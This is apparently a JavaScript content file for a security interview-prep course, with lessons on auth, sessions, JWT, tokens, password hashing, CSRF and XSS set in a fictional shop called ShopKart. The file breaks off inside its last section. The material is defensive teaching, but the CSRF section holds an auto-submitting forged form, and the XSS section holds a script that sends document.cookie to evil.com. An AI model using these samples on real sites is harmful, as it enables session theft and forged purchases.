/* Part 3 — Security (9 topics) — Deep Rewrite */
const PART3 = {
  id: "part3",
  icon: "🔒",
  title: "Part 3",
  name: "Security & Auth",
  topics: [
    {
      id: "p3t1",
      title: "Authentication vs Authorization",
      subtitle:
        "Two separate questions every system must answer: Who are you? What can you do?",
      sections: [
        {
          icon: "📖",
          color: "si-blue",
          title: "Simple Definition",
          body: `<p><strong>Authentication</strong> (AuthN) answers: <em>"Who are you?"</em> It verifies identity — confirming that Rahul is who he claims to be, usually via password, OTP, or token. <strong>Authorization</strong> (AuthZ) answers: <em>"What are you allowed to do?"</em> It enforces permissions — confirming that Rahul can see his own orders but not other users' orders.</p>
<p>Authentication always comes first. You must know who someone is before deciding what they can do. Confusing these two concepts leads to serious security bugs.</p>`,
        },
        {
          icon: "🔍",
          color: "si-purple",
          title: "Why They Are Separate Concerns",
          body: `<p>A successfully authenticated user is not automatically authorised to do everything. Rahul logs into ShopKart (authenticated). He should be able to view his own order history (authorised). He should NOT be able to view another user's order history, issue a refund (admin action), or edit a product listing (seller action). Authentication opens the door; authorization controls every room inside.</p>
<p>These are also implemented by different systems. Authentication might use OAuth2 + JWT. Authorization might use Role-Based Access Control (RBAC), Attribute-Based Access Control (ABAC), or a policy engine like OPA (Open Policy Agent) for complex rules.</p>`,
        },
        {
          icon: "🏪",
          color: "si-green",
          title: "ShopKart Access Control",
          body: `<p style="margin-bottom:10px;font-size:13px;">ShopKart's role and resource-level authorization matrix:</p>

<div style="background:rgba(0,0,0,0.12);border-radius:6px;padding:8px 12px;font-size:12px;font-family:monospace;line-height:1.9;color:var(--text-primary);margin-bottom:14px;">
-- JWT token for Rahul (CUSTOMER):<br/>
{ sub: "42", roles: ["CUSTOMER"], iat: ..., exp: ... }<br/><br/>
GET /orders/789:<br/>
1. Is token valid and not expired? (AuthN ✓)<br/>
2. Does order 789 belong to userId=42? (AuthZ – ownership) ✓<br/>
3. If no → 403 Forbidden ← not 401! It's authorization, not authentication<br/><br/>
PATCH /products/123 (edit product):<br/>
1. Valid token? (AuthN ✓)<br/>
2. Does user have SELLER or ADMIN role? (AuthZ – role check)<br/>
3. If SELLER: does product 123 belong to their store? (AuthZ – ownership)<br/><br/>
Bug: only checking token validity (AuthN), not ownership (AuthZ)<br/>
Rahul changes URL: /orders/789 → /orders/790 → sees Priya's order<br/>
= IDOR vulnerability
</div>

<div style="background:rgba(239,68,68,0.06);border:1px solid rgba(239,68,68,0.2);border-left:4px solid #ef4444;border-radius:8px;padding:12px 16px;font-size:13px;line-height:1.65;margin-bottom:12px;">
  <strong style="color:#ef4444;">🚨 IDOR — Most Common Auth Bug</strong><br/>
  <span style="color:var(--text-primary);opacity:0.9;">Insecure Direct Object Reference: API authenticates successfully but doesn't verify resource ownership. Always answer: "Does this authenticated user own THIS specific resource?" UUIDs make enumeration harder but are not a substitute for ownership checks.</span>
</div>

<div style="background:rgba(245,158,11,0.06);border:1px solid rgba(245,158,11,0.25);border-left:4px solid #f59e0b;border-radius:8px;padding:12px 16px;font-size:13px;line-height:1.65;">
  <strong style="color:#f59e0b;">🎯 Interview Insight</strong><br/>
  <span style="color:var(--text-primary);opacity:0.9;">"Users authenticate with JWT tokens. Authorization uses RBAC — each endpoint checks the required role, and resource-scoped endpoints additionally verify the user owns the specific resource they're trying to access. Two separate layers: role check first, ownership check second."</span>
</div>`,
        },
        {
          icon: "⚠️",
          color: "si-red",
          title: "IDOR — The Most Common AuthZ Bug",
          body: `<p style="margin-bottom:12px;">IDOR is the #1 authorization bug in web applications. It appears when route handlers check "is token valid?" (authentication) but skip "does this user own this record?" (authorization). Always verify resource ownership, NOT just token validity. Use 403 for authorization failures, not 401 (which means "not authenticated").</p>`,
        },
        {
          icon: "🎯",
          color: "si-orange",
          title: "Interview Insight",
          body: `<p style="margin-bottom:12px;">"Users authenticate with JWT tokens. Authorization uses RBAC — each endpoint checks the required role, and resource-scoped endpoints additionally verify the user owns that specific resource. Two layers: role check first (can this user type do this action at all?), then ownership check (does this user own THIS record?)."</p>`,
        },
      ],
    },

    {
      id: "p3t2",
      title: "Session-Based Authentication",
      subtitle:
        "The classic stateful auth model — server remembers who you are.",
      sections: [
        {
          icon: "📖",
          color: "si-blue",
          title: "Simple Definition",
          body: `<p>In <strong>session-based auth</strong>, after login the server creates a session object (containing user data, permissions, expiry) and stores it server-side (in Redis or a DB). The client receives only a <strong>session ID</strong> — a random opaque string. On every subsequent request, the client sends this session ID (via cookie or header), and the server looks it up in the session store to retrieve the user's context.</p>`,
        },
        {
          icon: "🔷",
          color: "si-cyan",
          title: "Step-by-Step Flow",
          body: `<p style="margin-bottom:10px;font-size:13px;">Session lifecycle — from login to logout:</p>

<div style="border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-bottom:16px;">
  <div style="padding:12px 16px;border-bottom:1px solid var(--border);background:rgba(99,102,241,0.06);font-size:12px;">
    <div style="font-weight:700;margin-bottom:4px;">🔐 1. Login</div>
    <code style="font-size:11px;">POST /auth/login → verify credentials via bcrypt</code>
  </div>
  <div style="padding:12px 16px;border-bottom:1px solid var(--border);font-size:12px;">
    <div style="font-weight:700;margin-bottom:4px;">📦 2. Create Session in Redis</div>
    <code style="font-size:11px;">session:sess_a3f2b1c4 → {userId:42, roles:["CUSTOMER"]} TTL:24h</code>
  </div>
  <div style="padding:12px 16px;border-bottom:1px solid var(--border);font-size:12px;">
    <div style="font-weight:700;margin-bottom:4px;">🍪 3. Send Cookie to Client</div>
    <code style="font-size:11px;">Set-Cookie: sessionId=sess_a3f2b1c4; HttpOnly; Secure; SameSite=Strict</code>
  </div>
  <div style="padding:12px 16px;border-bottom:1px solid var(--border);font-size:12px;">
    <div style="font-weight:700;margin-bottom:4px;">🔄 4. Each Request</div>
    <code style="font-size:11px;">Browser sends cookie → server looks up Redis → gets user context (~0.3ms)</code>
  </div>
  <div style="padding:12px 16px;font-size:12px;background:rgba(34,197,94,0.05);">
    <div style="font-weight:700;margin-bottom:4px;">✅ 5. Logout = Instant Revocation</div>
    <code style="font-size:11px;">DEL session:sess_a3f2b1c4 → session ID is now worthless everywhere, instantly</code>
  </div>
</div>`,
        },
        {
          icon: "🔷",
          color: "si-purple",
          title: "Sessions vs JWTs Comparison",
          body: `<div style="border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-bottom:16px;">
  <div style="padding:12px 16px;border-bottom:1px solid var(--border);background:rgba(99,102,241,0.06);display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;font-size:12px;font-weight:700;">
    <div></div><div>Sessions (Redis)</div><div>JWT Tokens</div>
  </div>
  <div style="padding:10px 16px;border-bottom:1px solid var(--border);display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;font-size:12px;">
    <div style="font-weight:600;">Storage</div><div>Server (Redis)</div><div>Client (cookie/memory)</div>
  </div>
  <div style="padding:10px 16px;border-bottom:1px solid var(--border);display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;font-size:12px;">
    <div style="font-weight:600;">Revocation</div><div style="color:#22c55e;">Instant — delete key</div><div style="color:#f59e0b;">Hard — wait for exp or blocklist</div>
  </div>
  <div style="padding:10px 16px;border-bottom:1px solid var(--border);display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;font-size:12px;">
    <div style="font-weight:600;">Scalability</div><div>Shared Redis (fine)</div><div style="color:#22c55e;">Stateless — any server</div>
  </div>
  <div style="padding:10px 16px;border-bottom:1px solid var(--border);display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;font-size:12px;">
    <div style="font-weight:600;">Request size</div><div style="color:#22c55e;">~20 byte cookie</div><div>200–400 byte token</div>
  </div>
  <div style="padding:10px 16px;display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;font-size:12px;">
    <div style="font-weight:600;">Best for</div><div>Web apps, account security</div><div>Microservices, mobile, APIs</div>
  </div>
</div>

<div style="background:rgba(99,102,241,0.08);border:1px solid rgba(99,102,241,0.25);border-left:4px solid var(--accent);border-radius:8px;padding:12px 16px;font-size:13px;line-height:1.65;">
  <strong style="color:var(--accent);">🏛️ The Architect's Rule</strong><br/>
  <span style="color:var(--text-primary);opacity:0.9;">"Sessions don't scale" is a myth. Redis handles millions of session lookups per second at ~0.3ms latency — negligible. Sessions win on revocation: instant on logout, instant on compromise. Use sessions for user-facing web apps where you need reliable logout. Use JWTs for microservices where stateless verification across multiple services matters.</span>
</div>`,
        },
        {
          icon: "🧠",
          color: "si-yellow",
          title: "Architect Thinking",
          body: `<p>Session-based auth is often undervalued. For ShopKart's main web application, sessions are excellent: instant logout (delete from Redis), easy to revoke all sessions if account is compromised, small cookie size. The "sessions don't scale" myth is outdated — Redis handles millions of session lookups per second with sub-millisecond latency. The trade-off is requiring a Redis lookup on every request (vs JWT which is self-contained). At ShopKart's scale, that Redis lookup is ~0.3ms — negligible.</p>`,
        },
      ],
    },

    {
      id: "p3t3",
      title: "JWT (JSON Web Tokens)",
      subtitle:
        "Self-contained cryptographic tokens that carry identity without a database lookup.",
      sections: [
        {
          icon: "📖",
          color: "si-blue",
          title: "Simple Definition",
          body: `<p style="margin-bottom:12px;">A <strong>JWT</strong> is a self-contained token encoding identity claims, cryptographically signed. Any server with the verification key can validate it without a database lookup. JWTs are stateless — the token itself is the session. Critical security note: the payload is <strong>base64-encoded, not encrypted</strong>. Anyone can decode it. Never put passwords or sensitive data in JWT payload.</p>`,
        },
        {
          icon: "🔍",
          color: "si-purple",
          title: "JWT Structure",
          body: `<p style="margin-bottom:10px;font-size:13px;">Three parts joined by dots — everything is base64url encoded (NOT encrypted):</p>

<div style="background:rgba(0,0,0,0.12);border-radius:6px;padding:8px 12px;font-size:12px;font-family:monospace;line-height:1.9;color:var(--text-primary);margin-bottom:14px;">
header.payload.signature<br/><br/>
Header: {"alg": "HS256", "typ": "JWT"}<br/>
Payload (VISIBLE — NOT secret!):<br/>
{<br/>
  "sub": "42", &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// user ID<br/>
  "roles": ["CUSTOMER"],<br/>
  "email": "rahul@example.com",<br/>
  "iat": 1741420800,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// issued at<br/>
  "exp": 1741507200&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// expires in 24h<br/>
}<br/>
Signature: HMACSHA256(header+"."+payload, SECRET_KEY)<br/>
→ proves no one tampered with the payload<br/><br/>
⚠️ JWT payload is ENCODED, not ENCRYPTED.<br/>
Anyone can run atob() and read every field.<br/>
NEVER put passwords, SSNs, or secrets in JWT payload.
</div>`,
        },
        {
          icon: "🏪",
          color: "si-green",
          title: "ShopKart JWT Flow",
          body: `<p style="margin-bottom:10px;font-size:13px;">JWT flow across ShopKart's microservices:</p>

<div style="border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-bottom:16px;">
  <div style="padding:12px 16px;border-bottom:1px solid var(--border);font-size:12px;"><span style="font-weight:700;">🔐 Login</span> → Auth Service signs JWT with RS256 private key</div>
  <div style="padding:12px 16px;border-bottom:1px solid var(--border);font-size:12px;"><span style="font-weight:700;">🍪 Cookie</span> → Token stored in HttpOnly cookie (NOT localStorage — XSS risk)</div>
  <div style="padding:12px 16px;border-bottom:1px solid var(--border);font-size:12px;"><span style="font-weight:700;">&#9889; API calls</span> → <code>Authorization: Bearer eyJhbGc...</code></div>
  <div style="padding:12px 16px;border-bottom:1px solid var(--border);font-size:12px;"><span style="font-weight:700;">🔧 Microservice verification</span> → Order Service, Payment Service each verify JWT with public key. No Redis lookup. No round-trip to Auth Service.</div>
  <div style="padding:12px 16px;font-size:12px;"><span style="font-weight:700;">&#8987; Expiry</span> → Token expires (exp claim). Client uses refresh token for new access token silently.</div>
</div>`,
        },
        {
          icon: "⚠️",
          color: "si-red",
          title: "Critical JWT Vulnerabilities",
          body: `<div style="border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-bottom:16px;">
  <div style="padding:12px 16px;border-bottom:1px solid var(--border);background:rgba(239,68,68,0.05);">
    <div style="font-weight:700;font-size:13px;color:#ef4444;margin-bottom:4px;">❌ alg=none attack</div>
    <p style="margin:0;font-size:12px;opacity:0.85;line-height:1.6;">Old JWT libraries accepted tokens with <code>"alg":"none"</code> — no signature verification. Attacker crafts a token with any userId. Always explicitly allowlist algorithms server-side. Never trust the algorithm specified in the token header.</p>
  </div>
  <div style="padding:12px 16px;border-bottom:1px solid var(--border);background:rgba(239,68,68,0.05);">
    <div style="font-weight:700;font-size:13px;color:#ef4444;margin-bottom:4px;">❌ JWT in localStorage</div>
    <p style="margin:0;font-size:12px;opacity:0.85;line-height:1.6;">Any XSS vulnerability reads localStorage with one line. HttpOnly cookies cannot be read by JavaScript — even a successful XSS can't steal the token.</p>
  </div>
  <div style="padding:12px 16px;border-bottom:1px solid var(--border);background:rgba(239,68,68,0.05);">
    <div style="font-weight:700;font-size:13px;color:#ef4444;margin-bottom:4px;">❌ Long expiry without refresh tokens</div>
    <p style="margin:0;font-size:12px;opacity:0.85;line-height:1.6;">A 30-day JWT cannot be revoked. Use 15-minute access tokens + 7-day refresh tokens stored in Redis for revocation.</p>
  </div>
  <div style="padding:12px 16px;background:rgba(239,68,68,0.05);">
    <div style="font-weight:700;font-size:13px;color:#ef4444;margin-bottom:4px;">❌ Weak HS256 secret</div>
    <p style="margin:0;font-size:12px;opacity:0.85;line-height:1.6;">HMAC-SHA256 with a short secret can be brute-forced offline from any captured token. Use RS256 (asymmetric) or a randomly generated 256-bit+ secret.</p>
  </div>
</div>`,
        },
        {
          icon: "🎯",
          color: "si-orange",
          title: "Interview Insight",
          body: `<p style="margin-bottom:12px;">"For microservices, JWTs enable stateless verification — each service validates the token without calling a central auth service. We use RS256: Auth Service holds the private key, every other service only needs the public key. Access tokens expire in 15 minutes; refresh tokens (HttpOnly cookie) valid 7 days and stored in Redis for instant revocation. Compromised account: delete all refresh tokens from Redis, all access tokens expire naturally in &lt;15 min."</p>`,
        },
      ],
    },

    {
      id: "p3t4",
      title: "Access Tokens & Refresh Tokens",
      subtitle:
        "Short-lived security with seamless user experience — the best of both worlds.",
      sections: [
        {
          icon: "📖",
          color: "si-blue",
          title: "Simple Definition",
          body: `<p>An <strong>access token</strong> is a short-lived JWT (typically 15 minutes) used to authenticate API requests. A <strong>refresh token</strong> is a long-lived opaque token (typically 7–30 days) used solely to obtain new access tokens when the old one expires. This two-token system balances security (short-lived access tokens) with user experience (no frequent logins).</p>`,
        },
        {
          icon: "🔷",
          color: "si-cyan",
          title: "Two-Token Flow",
          body: `<p style="margin-bottom:10px;font-size:13px;">Two-token dance: short-lived access for security, long-lived refresh for UX:</p>

<div style="background:rgba(0,0,0,0.12);border-radius:6px;padding:8px 12px;font-size:12px;font-family:monospace;line-height:1.9;color:var(--text-primary);margin-bottom:14px;">
Login response:<br/>
  access_token: eyJhbGc...&nbsp; (JWT, exp:15min) → stored in JS memory<br/>
  refresh_token: rt_a3f2b1c4... (opaque, 7days) → HttpOnly cookie<br/><br/>
Normal API calls (next 15 min):<br/>
  GET /orders → Authorization: Bearer {access_token} ✅<br/><br/>
Access token expires:<br/>
  GET /orders → 401 Unauthorized<br/>
  → Auto: POST /auth/refresh (refresh_token sent via cookie)<br/>
  → Server: is this token in Redis? Not revoked? → issue new JWT<br/>
  → Retry: GET /orders → ✅ (user never notices)<br/><br/>
Logout:<br/>
  DELETE refresh_token from Redis<br/>
  → access_token expires naturally in ≤15 min<br/>
  → No further refresh possible → fully logged out
</div>

<div style="background:rgba(99,102,241,0.08);border:1px solid rgba(99,102,241,0.25);border-left:4px solid var(--accent);border-radius:8px;padding:12px 16px;font-size:13px;line-height:1.65;">
  <strong style="color:var(--accent);">🏛️ The Architect's Rule</strong><br/>
  <span style="color:var(--text-primary);opacity:0.9;">Access token in memory (lost on page refresh, invisible to XSS). Refresh token in HttpOnly cookie (auto-sent by browser, invisible to JavaScript, protected from CSRF with SameSite=Strict). Never in localStorage — any XSS vulnerability in any package on your page steals every user's token permanently.</span>
</div>`,
        },
        {
          icon: "🧠",
          color: "si-yellow",
          title: "Architect Thinking — Token Storage",
          body: `<p>Where to store tokens is a security-usability trade-off:</p>
<ul>
  <li><strong>Access token in memory</strong> (JavaScript variable): Lost on page refresh, invisible to XSS, but doesn't survive navigation. Best security for SPA applications.</li>
  <li><strong>Refresh token in HttpOnly cookie</strong>: Invisible to JavaScript (XSS proof). Automatically sent by browser. Protected from CSRF with SameSite=Strict. This is the recommended production pattern.</li>
  <li><strong>Never store tokens in localStorage</strong>: Any XSS vulnerability (injected script, compromised npm package) can steal ALL localStorage tokens. A single XSS attack persists across sessions — attacker retains access until user manually revokes.</li>
</ul>`,
        },
      ],
    },

    {
      id: "p3t5",
      title: "Password Hashing",
      subtitle:
        "Storing passwords so that even if your database is stolen, passwords remain secret.",
      sections: [
        {
          icon: "📖",
          color: "si-blue",
          title: "Simple Definition",
          body: `<p style="margin-bottom:12px;">A <strong>password hash</strong> is a one-way transformation: the original password can never be recovered from it. When Rahul logs in, ShopKart hashes his input and compares to the stored hash. The actual password is never stored anywhere. If the database is stolen, attackers get hashes, not passwords. With bcrypt: hashes are computationally expensive to reverse (intentional design).</p>`,
        },
        {
          icon: "🔍",
          color: "si-purple",
          title: "Why Simple Hashing is Not Enough",
          body: `<div style="border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-bottom:16px;">
  <div style="padding:14px 16px;border-bottom:1px solid var(--border);background:rgba(239,68,68,0.05);">
    <div style="font-weight:700;font-size:14px;color:#ef4444;margin-bottom:6px;">❌ Plain Hash (MD5/SHA-256) — NEVER use for passwords</div>
    <div style="background:rgba(0,0,0,0.12);border-radius:6px;padding:8px 12px;font-size:12px;font-family:monospace;line-height:1.9;color:var(--text-primary);">
SHA-256("shopkart123") = "2c624232cdd2..."
<br/>Problem 1: Attacker pre-computes ALL common password hashes (rainbow table). "shopkart123" is common → instant crack.<br/>Problem 2: GPU computes 1 billion SHA-256/second. Brute-force 8-char passwords: minutes.
    </div>
  </div>
  <div style="padding:14px 16px;background:rgba(34,197,94,0.06);">
    <div style="font-weight:700;font-size:14px;color:#22c55e;margin-bottom:6px;">✅ Adaptive Hash (bcrypt/Argon2) — correct</div>
    <div style="background:rgba(0,0,0,0.12);border-radius:6px;padding:8px 12px;font-size:12px;font-family:monospace;line-height:1.9;color:var(--text-primary);">
bcrypt("shopkart123", cost=12) = "$2b$12$x9f2b3c4..."← ~250ms<br/>Random salt per user → rainbow tables useless<br/>cost=12: intentionally slow. GPU = still only 4 hashes/sec.<br/>Brute-force 8-char passwords: years, not minutes.
    </div>
  </div>
</div>`,
        },
        {
          icon: "🏪",
          color: "si-green",
          title: "ShopKart Password Implementation",
          body: `<p style="margin-bottom:10px;font-size:13px;">ShopKart's complete password lifecycle:</p>

<div style="background:rgba(0,0,0,0.12);border-radius:6px;padding:8px 12px;font-size:12px;font-family:monospace;line-height:1.9;color:var(--text-primary);margin-bottom:14px;">
-- Registration:<br/>
bcrypt.hash("mySecurePass123!", 12)<br/>
→ store ONLY the hash<br/>
→ never store plaintext<br/><br/>
-- Login verification:<br/>
bcrypt.compare(inputPassword, storedHash)<br/>
→ returns boolean (doesn't reveal original password)<br/><br/>
-- Password Reset (safe approach):<br/>
1. Generate random reset token (UUID v4)<br/>
2. Store HASH of token + expiry (15 min) in DB<br/>
3. Email the TOKEN (not the hash) in URL: /reset?token=uuid<br/>
4. On reset: verify token hash, accept new password, hash it, delete token<br/><br/>
-- NEVER: email passwords, log passwords, store plaintext
</div>`,
        },
        {
          icon: "⚠️",
          color: "si-red",
          title: "Critical Mistakes",
          body: `<div style="border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-bottom:14px;">
  <div style="padding:12px 16px;border-bottom:1px solid var(--border);background:rgba(239,68,68,0.05);">
    <div style="font-weight:700;color:#ef4444;margin-bottom:4px;font-size:13px;">❌ MD5 or SHA-1 for passwords</div>
    <p style="margin:0;font-size:12px;opacity:0.85;">Fast algorithms designed for checksums. Both completely broken for password storage — cracked in milliseconds.</p>
  </div>
  <div style="padding:12px 16px;border-bottom:1px solid var(--border);background:rgba(239,68,68,0.05);">
    <div style="font-weight:700;color:#ef4444;margin-bottom:4px;font-size:13px;">❌ Storing plaintext passwords anywhere</div>
    <p style="margin:0;font-size:12px;opacity:0.85;">Not in DB, not in logs, not in emails. When a user resets their password, email a reset LINK (token) — never their current or new password.</p>
  </div>
  <div style="padding:12px 16px;background:rgba(239,68,68,0.05);">
    <div style="font-weight:700;color:#ef4444;margin-bottom:4px;font-size:13px;">❌ SHA-256 without per-user salt</div>
    <p style="margin:0;font-size:12px;opacity:0.85;">Identical passwords produce identical hashes. One cracked hash reveals all users with that password. bcrypt auto-generates unique salt per hash.</p>
  </div>
</div>

<div style="background:rgba(245,158,11,0.06);border:1px solid rgba(245,158,11,0.25);border-left:4px solid #f59e0b;border-radius:8px;padding:12px 16px;font-size:13px;line-height:1.65;">
  <strong style="color:#f59e0b;">🎯 Interview Insight</strong><br/>
  <span style="color:var(--text-primary);opacity:0.9;">Always specify bcrypt or Argon2 (never MD5/SHA for passwords): "We hash with bcrypt at cost factor 12 — intentionally 250ms per hash which prevents brute force. bcrypt auto-generates unique salt per user, preventing rainbow table attacks." This specificity demonstrates real security knowledge.</span>
</div>`,
        },
        {
          icon: "🎯",
          color: "si-orange",
          title: "Interview Insight",
          body: `<p style="margin-bottom:12px;">"We hash passwords with bcrypt at cost factor 12 — intentionally slow at 250ms per hash, which makes brute force infeasible. bcrypt auto-generates unique salt per user, preventing rainbow table attacks. Password resets use a time-limited random token emailed as a URL — we never email passwords or store plaintext anywhere."</p>`,
        },
      ],
    },

    {
      id: "p3t6",
      title: "CSRF Attacks",
      subtitle:
        "Protecting users from being tricked into performing actions they didn't intend.",
      sections: [
        {
          icon: "📖",
          color: "si-blue",
          title: "Simple Definition",
          body: `<p style="margin-bottom:12px;">In a CSRF attack, a malicious website tricks Rahul's browser into making authenticated requests to ShopKart using his real cookies. Since the browser auto-includes cookies on every request, ShopKart can't distinguish Rahul's genuine request from one forged by evil-site.com — unless you use CSRF protections.</p>`,
        },
        {
          icon: "🔍",
          color: "si-purple",
          title: "The Attack",
          body: `<p style="margin-bottom:10px;font-size:13px;">The CSRF attack mechanism — browser as an unwitting accomplice:</p>

<div style="background:rgba(0,0,0,0.12);border-radius:6px;padding:8px 12px;font-size:12px;font-family:monospace;line-height:1.9;color:var(--text-primary);margin-bottom:14px;">
1. Rahul logged into shopkart.com (his session cookie is in browser)<br/>
2. Rahul clicks a link → visits evil-site.com<br/>
3. evil-site.com HTML:<br/>
   &lt;form action="https://shopkart.com/orders" method="POST"&gt;<br/>
   &nbsp;&nbsp;&lt;input name="product_id" value="999"/&gt;<br/>
   &lt;/form&gt;<br/>
   &lt;script&gt;document.forms[0].submit()&lt;/script&gt;<br/>
4. Browser submits the form TO shopkart.com<br/>
   → auto-includes Rahul's session cookie<br/>
5. ShopKart sees valid authenticated request<br/>
   → places order! Rahul bought something he didn't intend to.
</div>`,
        },
        {
          icon: "🏪",
          color: "si-green",
          title: "CSRF Defences",
          body: `<div style="border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-bottom:16px;">
  <div style="padding:12px 16px;border-bottom:1px solid var(--border);background:rgba(34,197,94,0.06);">
    <div style="font-weight:700;font-size:13px;color:#22c55e;margin-bottom:4px;">✅ SameSite=Strict (best, modern defence)</div>
    <p style="margin:0;font-size:12px;opacity:0.85;line-height:1.6;">Browser will not send cookie when request originates from a different site. Single flag defeats most CSRF attacks. Supported in all modern browsers.</p>
  </div>
  <div style="padding:12px 16px;border-bottom:1px solid var(--border);">
    <div style="font-weight:700;font-size:13px;color:#10b981;margin-bottom:4px;">✅ CSRF Token</div>
    <p style="margin:0;font-size:12px;opacity:0.85;line-height:1.6;">Server embeds random token per session in every form. Validates it on every state-changing request. evil-site.com can't read this token (cross-origin), so forged forms lack it.</p>
  </div>
  <div style="padding:12px 16px;border-bottom:1px solid var(--border);">
    <div style="font-weight:700;font-size:13px;color:#8b5cf6;margin-bottom:4px;">✅ Origin/Referer validation</div>
    <p style="margin:0;font-size:12px;opacity:0.85;line-height:1.6;">Check that Origin or Referer header matches your domain. Forged cross-origin requests will show evil-site.com as Origin.</p>
  </div>
  <div style="padding:12px 16px;">
    <div style="font-weight:700;font-size:13px;color:var(--accent);margin-bottom:4px;">✅ JWT in headers (CSRF immune)</div>
    <p style="margin:0;font-size:12px;opacity:0.85;line-height:1.6;">CSRF requires cookies being auto-sent. JWTs in Authorization headers are NOT auto-sent cross-origin. SPAs using JWTs in headers are inherently CSRF safe.</p>
  </div>
</div>`,
        },
        {
          icon: "🎯",
          color: "si-orange",
          title: "Interview Insight",
          body: `<p style="margin-bottom:12px;">For SPAs using JWT in headers: CSRF is not a threat — CSRF exploits cookies being auto-sent, and Authorization headers are NOT auto-sent cross-origin. For cookie-based sessions, <code>SameSite=Strict</code> is now the primary defence. CSRF tokens are still used for defense-in-depth on critical forms like payments. Choose your CSRF protection strategy based on your auth mechanism.</p>`,
        },
      ],
    },

    {
      id: "p3t7",
      title: "XSS (Cross-Site Scripting)",
      subtitle: "Injecting malicious scripts into pages that other users view.",
      sections: [
        {
          icon: "📖",
          color: "si-blue",
          title: "Simple Definition",
          body: `<p><strong>XSS</strong> (Cross-Site Scripting) is an attack where malicious JavaScript is injected into web pages and executed in other users' browsers. The attacker's script runs in the context of ShopKart.com — with access to everything your JavaScript can access: DOM, localStorage, cookies (if not HttpOnly), and the ability to make API calls as the user.</p>`,
        },
        {
          icon: "🔍",
          color: "si-purple",
          title: "Types of XSS",
          body: `<div style="border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-bottom:14px;">
  <div style="padding:14px 16px;border-bottom:1px solid var(--border);background:rgba(239,68,68,0.05);">
    <div style="font-weight:700;font-size:14px;color:#ef4444;margin-bottom:6px;">🚨 Stored XSS (Persistent)</div>
    <p style="margin:0;font-size:13px;opacity:0.85;line-height:1.65;">Attacker submits malicious script as a product review: <code>&lt;script&gt;fetch('evil.com/?c='+document.cookie)&lt;/script&gt;</code>. ShopKart stores it in DB and renders it on the product page. <strong>Every user viewing that product runs the attacker's code</strong> — steals cookies, logs keystrokes, redirects to phishing.</p>
  </div>
  <div style="padding:14px 16px;border-bottom:1px solid var(--border);background:rgba(245,158,11,0.04);">
    <div style="font-weight:700;font-size:14px;color:#f59e0b;margin-bottom:6px;">⏳ Reflected XSS</div>
    <p style="margin:0;font-size:13px;opacity:0.85;line-height:1.65;">Malicious script is in the URL: <code>shopkart.com/search?q=&lt;script&gt;...&lt;/script&gt;</code>. If ShopKart renders the query without escaping, script runs. Attack delivered via phishing link — victim must click the crafted URL.</p>
  </div>
  <div style="padding:14px 16px;background:rgba(99,102,241,0.06);">
    <div style="font-weight:700;font-size:14px;color:var(--accent);margin-bottom:6px;">🔧 DOM-Based XSS</div>
    <p style="margin:0;font-size:13px;opacity:0.85;line-height:1.65;">No server involved. JavaScript reads from URL hash/params and writes to DOM without sanitisation. Entirely client-side vulnerability. Harder to detect; server never sees the payload.</p>
  </div>
</div>`,
        },
        {
          icon: "🏪",
          color: "si-green",
          title: "ShopKart XSS Defences",
          body: `<div style="border:1px solid var(--border);border-radius:10px;overflow:hidden;margin-bottom:16px;">
  <div style="padding:12px 16px;border-bottom:1px solid var(--border);background:rgba(34,197,94,0.06);">
    <div style="font-weight:700;font-size:13px;color:#22c55e;margin-bottom:4px;">✅ Output Encoding (Primary Defence)</div>
    <p style="margin:0;font-size:12px;opacity:0.85;line-height:1.6;">Encode all user data before rendering in HTML. <code>&lt;</code> becomes <code>&amp;lt;</code>. React does this automatically for JSX. Never use <code>innerHTML</code> or <code>dangerouslySetInnerHTML</code> with user input.</p>
  </div>
  <div style="padding:12px 16px;border-bottom:1px solid var(--border);">
    <div style="font-weight:700;font-size:13px;color:#10b981;margin-bottom:4px;">✅ Content Security Policy (CSP)</div>
    <p style="margin:0;font-size:12px;opacity:0.85;line-height:1.6;">HTTP header dictating which scripts may run. <code>default-src 'self'</code> blocks all scripts not from your domain — even successfully injected scripts won’t execute.</p>
  </div>
  <div style="padding:12px 16px;border-bottom:1px solid var(--border);">
    <div style="font-weight:700;font-size:13px;color:#8b5cf6;margin-bottom:4px;">✅ HttpOnly Cookies</div>
    <p style="margin:0;font-size:12px;opacity:0.85;line-height:1.6;">Session tokens in HttpOnly cookies cannot be read by <code>document.cookie</code>. The most common XSS payload goal (steal session) is completely defeated.</p>
  </div>
  <div style="padding:12px 16px;">
    <div style="font-weight:700;font-size:13px;color:var(--accent);margin-bottom:4px;">✅ Server-side Sanitisation</div>
    <p style="margin:0;font-size:12px;opacity:0.85;line-height:1.6;">Reject malformed input early. For rich text fields, sanitise HTML with DOMPurify server-side — never trust client-sent HTML directly.</p>
  </div>
</div>

<div style="background:rgba(245,158,11,0.06);border:1px solid rgba(245,158,11,0.25);border-left:4px solid #f59e0b;border-radius:8px;padding:12px 16px;font-size:13px;line-height:1.65;">
  <strong style="color:#f59e0b;">🎯 Interview: XSS vs CSRF</strong><br/>
  <span style="color:var(--text-primary);opacity:0.9;">XSS: attacker injects code that runs in the victim’s browser (attacker’s code, victim’s context). CSRF: attacker tricks the victim’s browser into sending requests using victim’s credentials (victim’s browser, victim’s credentials, attacker’s intent). XSS is generally more dangerous — it can steal credentials, perform actions, and spread virally.</span>
</div>`,
        },
        {
          icon: "🎯",
          color: "si-orange",
          title: "Interview Insight",
